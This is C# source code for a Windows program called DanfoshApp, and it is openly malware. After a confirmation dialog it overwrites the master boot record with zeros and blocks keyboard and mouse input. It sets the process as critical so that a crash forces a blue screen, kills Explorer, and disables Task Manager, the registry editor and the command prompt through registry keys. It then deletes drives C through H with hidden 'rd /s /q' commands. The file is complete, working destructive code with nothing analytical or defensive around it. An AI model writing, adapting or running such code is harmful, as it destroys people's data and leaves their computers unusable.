using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace DanfoshApp
{
    public class Danfosh
    {
        // DLL native imports for MBR (copied)
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        // dwCreationDisposition
        private const uint OpenExisting = 0x3;

        // dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        // DLL native imports for BSOD (copied)
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        // DLL native imports for block input (copied)
        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        public static void Main()
        {
            DialogResult result = MessageBox.Show("This is malware." + Environment.NewLine + "Do you want to continue?", "DanfoshApp - Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result == DialogResult.Yes)
            {
                Danfosh danfosh = new Danfosh();
                Thread payloads = new Thread(danfosh.Payloads);
                payloads.Start();
            }
            else
                Environment.Exit(0);
        }
        public void Payloads()
        {
            // Overwrite the MBR
            Thread mbrOverwrite = new Thread(Mbr);
            mbrOverwrite.Start();

            // Block input
            Thread blockInput = new Thread(LockInput);
            blockInput.Start();

            // BSOD
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            // Start the amazing Form
            Thread formThread = new Thread(FormStart);
            formThread.Start();

            // Kill Windows Explorer
            Process[] pname = Process.GetProcessesByName("explorer");
            if (pname.Length == 1)
            {
                ProcessStartInfo block_exp = new ProcessStartInfo();
                block_exp.FileName = "cmd.exe";
                block_exp.WindowStyle = ProcessWindowStyle.Hidden;
                block_exp.Arguments = @"/k taskkill /f /im explorer.exe && exit";
                Process.Start(block_exp);
            }

            // Disable the task manager
            RegistryKey DisTaskMgr = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            DisTaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            // Disable the registry editor
            RegistryKey DisRegedit = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            DisRegedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            // Disable the command prompt
            RegistryKey DisCMD = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            DisCMD.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

            string resPath = @"C:\Program Files\Temp";
            Directory.CreateDirectory(resPath);

            Thread.Sleep(1000);

            Thread sysKill = new Thread(Destruction);
            sysKill.Start();
        }
        public void FormStart()
        {
            var Form = new DanfoshForm();
            Form.ShowDialog();
        }
        public void Mbr()
        {
            var mbrData = new byte[MbrSize];
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            try
            {
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                CloseHandle(mbr);
            }
            catch { }
        }
        public void Destruction()
        {
            ProcessStartInfo wipe = new ProcessStartInfo();
            wipe.FileName = "cmd.exe";
            wipe.WindowStyle = ProcessWindowStyle.Hidden;

            for (char p = 'c'; p < 'i'; p++)
            {
                wipe.Arguments = @"/k rd " + p + @":\\/s /q && exit";
                Process.Start(wipe);
            }
        }
        public void LockInput()
        {
            while (true)
                BlockInput(true);
        }
    }
}